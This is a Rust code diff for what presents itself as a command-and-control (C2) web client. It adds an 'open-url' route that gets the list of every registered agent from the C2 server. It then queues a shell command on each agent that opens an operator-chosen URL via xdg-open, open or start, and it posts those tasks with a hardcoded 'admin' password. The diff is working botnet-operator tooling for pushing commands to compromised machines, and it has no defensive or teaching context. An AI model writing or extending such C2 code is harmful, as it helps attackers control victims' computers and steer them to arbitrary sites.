@@ -370,6 +370,11 @@ struct TaskForm {
     command: String,
 }
 
+#[derive(Deserialize)]
+struct OpenUrlForm {
+    url: String,
+}
+
 fn format_datetime(dt: &str) -> String {
     if let Ok(parsed) = DateTime::parse_from_rfc3339(dt) {
         let now = Utc::now();
@@ -579,6 +584,51 @@ async fn create_task(
     Ok(Redirect::to(&format!("/agent/{}", agent_id)))
 }
 
+async fn open_url_all_agents(Form(form): Form<OpenUrlForm>) -> Result<impl IntoResponse, String> {
+    let c2_server_url = get_c2_server_url();
+    let client = reqwest::Client::new();
+
+    let response = client
+        .get(format!("{}/agents", c2_server_url))
+        .send()
+        .await
+        .map_err(|e| format!("Failed to fetch agents: {}", e))?;
+
+    let agents: Vec<serde_json::Value> = response
+        .json()
+        .await
+        .map_err(|e| format!("Failed to parse agents: {}", e))?;
+
+    let sanitized_url = form.url.replace('\'', "'\\''");
+    let command = format!(
+        "xdg-open '{}' 2>/dev/null || open '{}' 2>/dev/null || start '{}'",
+        sanitized_url, sanitized_url, sanitized_url
+    );
+
+    for agent in &agents {
+        if let Some(agent_id_str) = agent["id"].as_str() {
+            if let Ok(agent_uuid) = Uuid::parse_str(agent_id_str) {
+                let request = AddTaskRequest {
+                    password: "admin".to_string(),
+                    agent_id: agent_uuid,
+                    command: command.clone(),
+                };
+
+                if let Err(e) = client
+                    .post(format!("{}/add_task", c2_server_url))
+                    .json(&request)
+                    .send()
+                    .await
+                {
+                    eprintln!("[-] Failed to send open-url task to agent {}: {}", agent_id_str, e);
+                }
+            }
+        }
+    }
+
+    Ok(Redirect::to("/"))
+}
+
 #[tokio::main]
 async fn main() {
     let c2_server_url = get_c2_server_url();
@@ -586,7 +636,8 @@ async fn main() {
     let app = Router::new()
         .route("/", get(index))
         .route("/agent/:id", get(agent_detail))
-        .route("/agent/:id/task", post(create_task));
+        .route("/agent/:id/task", post(create_task))
+        .route("/open-url", post(open_url_all_agents));
 
     let addr = SocketAddr::from(([127, 0, 0, 1], 3000));
     println!("[*] [ REDACTED ] C2 Web Client starting...");
